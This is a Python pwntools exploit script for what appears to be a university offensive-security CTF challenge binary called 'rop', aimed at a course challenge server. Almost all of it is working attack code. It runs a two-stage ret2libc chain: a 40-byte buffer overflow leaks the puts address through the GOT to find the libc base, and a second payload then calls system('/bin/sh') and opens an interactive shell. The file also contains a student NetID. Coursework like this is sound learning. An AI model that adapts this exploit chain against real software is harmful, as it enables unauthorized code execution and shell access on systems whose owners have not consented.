import os
import string
import struct
from itertools import chain
from typing import Any, Iterable, List

from pwn import *

binary = './rop'
context.binary = binary
context.terminal = ['tilix', '-e']

def flatten(items: Iterable) -> List[Any]:
    return list(chain.from_iterable(items))

def make_breakpoints(breakpoints: List[str]) -> List[str]:
    return list(map(lambda b: f'b* {b}', breakpoints))

def make_commands(args: List[str]) -> List[str]:
    return flatten(map(lambda a: ['-ex', a], args))

breakpoints = [
    # '0x40064a', # RET
]

print_statements = []

breakpoints = make_breakpoints(breakpoints)
commands = make_commands(breakpoints + print_statements)

# LIBC
# libc = ELF('/nix/store/c35hf8g5b9vksadym9dbjrd6p2y11m8h-glibc-2.35-224/lib/libc.so.6')
libc = ELF('lib/libc.so.6')
bin_sh_offset = next(libc.search(b'/bin/sh\x00'))
system_offset = libc.symbols[b'system']
puts_offset = libc.symbols[b'puts']

# ROP
rop = ELF('rop')
puts_plt = rop.plt[b'puts']
puts_got = rop.got[b'puts']
main = rop.symbols[b'main']

print(
    hex(main),
    hex(puts_plt),
    hex(puts_got),
    hex(bin_sh_offset),
    hex(system_offset),
)

pop_rdi_ret = 0x004006b3 #: pop rdi ; ret

# with process(['pwndbg', binary] + commands, aslr=False) as p:
# with process(binary, aslr=False) as p:
with remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1343) as p:

    is_remote = isinstance(p, remote)

    if is_remote:
        p.recvuntil(b'Please input your NetID (something like abc123): ')
        p.sendline(b'nf2137')

    if not is_remote and 'pwndbg' in p.program:
        p.sendline(b'r')

    p.recvuntil(b"Can you pop shell? I took away all the useful tools..")

    # Stage 1 Payload
    payload = b'A' * 40
    payload += p64(pop_rdi_ret)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)
    p.sendline(payload)

    p.recvline()

    leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc_base = leaked_puts - puts_offset
    bin_sh = libc_base + bin_sh_offset
    system = libc_base + system_offset

    log.info(f'libc base: {hex(libc_base)}')
    log.info(f'/bin/sh: {hex(bin_sh)}')
    log.info(f'system: {hex(system)}')
    log.info(f'puts: {hex(libc_base + puts_offset)}')

    # Stage 2 Payload
    payload = b'A' * 40
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh)
    payload += p64(system)

    p.sendline(payload)
    p.recv()

    p.interactive()
